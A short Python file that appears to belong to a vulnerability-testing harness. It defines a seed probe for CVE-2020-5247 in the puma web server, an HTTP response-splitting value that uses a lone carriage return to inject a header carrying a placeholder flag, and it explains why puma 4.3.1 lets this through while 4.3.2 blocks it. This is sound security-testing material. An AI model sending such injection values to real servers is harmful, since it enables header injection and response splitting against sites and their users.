#!/usr/bin/env python3
"""[GIVEN] CVE-2020-5247 seed exploit — HTTP response splitting via a REGULAR
response header value.

The Rack app reflects ?x=<value> into `X-Reflected: <value>`. A value carrying
CR/LF splits the header stream so the attacker's injected line appears verbatim
in the raw response (HTTP response splitting, CWE-113).

Contract:
  - V0 (puma 4.3.1): no guard -> the split lands -> flag appears -> reaches flag.
  - V1 (puma 4.3.2): the CVE-2020-5247 guard
        headers.reject! { |_k, v| CRLF_REGEX =~ v.to_s }
    drops the whole X-Reflected header -> flag absent -> BLOCKED (differential
    precondition for the residual).

`__PCB_FLAG__` is a placeholder; oracle.run_probe substitutes the per-run flag,
so the system-under-test never learns the flag value.
"""
from __future__ import annotations

# Split-inducing value: a lone CR (\r) followed by the injected content carrying
# the flag. Puma splits response header values only on LF, so keeping the flag on
# the SAME \r-bearing segment means the guard's /[\r\n]/ check (which fires on the
# \r) is exactly what determines whether the flag reaches the wire — a clean
# accept/reject differential. Lone CR is a recognised response-splitting vector.
VALUE = "pcbseed\rX-Pcb-Injected: __PCB_FLAG__"


def candidate() -> dict:
    return {
        "probe_id": "cve-2020-5247-regular-header-crlf",
        "sink": "regular_header",
        "param": "x",
        "value": VALUE,
    }


if __name__ == "__main__":
    print(candidate())
